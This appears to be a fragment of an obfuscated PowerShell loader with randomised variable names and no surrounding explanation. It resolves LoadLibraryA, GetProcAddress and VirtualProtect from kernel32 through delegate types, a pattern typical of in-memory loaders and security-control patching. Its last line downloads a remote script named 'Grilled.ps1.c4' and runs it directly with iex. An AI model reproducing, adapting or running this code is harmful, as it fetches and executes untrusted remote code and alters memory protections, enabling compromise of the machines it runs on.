$yNTnKguheFtVbjZlALYyCivQeYYTfbddJQcyyrQHXJMw = Get-ProcAddress kernel32.dll LoadLibraryA
$krpRPJlDEAUpIXckndDbTKlxGCQMyLCVXQIbiXirfL = Get-DelegateType @([String]) ([IntPtr])
$PYGWIvrGuojMqGrprgzybpIKtVBsUDWhwaRwvK = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yNTnKguheFtVbjZlALYyCivQeYYTfbddJQcyyrQHXJMw,
$krpRPJlDEAUpIXckndDbTKlxGCQMyLCVXQIbiXirfL)
$UlonZyIkAYIWfLrewpYdEpiEyWsjtTpli = Get-ProcAddress kernel32.dll GetProcAddress
$NtLAhBGPMcHZoPdkFEWiTbYtlpbmCFCYvjGjpt = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UlonZyIkAYIWfLrewpYdEpiEyWsjtTpli,
$NtLAhBGPMcHZoPdkFEWiTbYtlpbmCFCYvjGjpt)
$dQjUDytccSvPJnOyogImwsCmggjCTYqJHqD = Get-ProcAddress kernel32.dll VirtualProtect
$fvsOOwBSXHLWfHGkQJjuKsqMoSCjGMHPN = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$JHoXVwaJxHwznJGRzaUnDYJYtlCJxvWDZqqrfpYt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($dQjUDytccSvPJnOyogImwsCmggjCTYqJHqD,
$fvsOOwBSXHLWfHGkQJjuKsqMoSCjGMHPN)
$wbc.DownloadString("$prefixpath/Grilled.ps1.c4") | iex
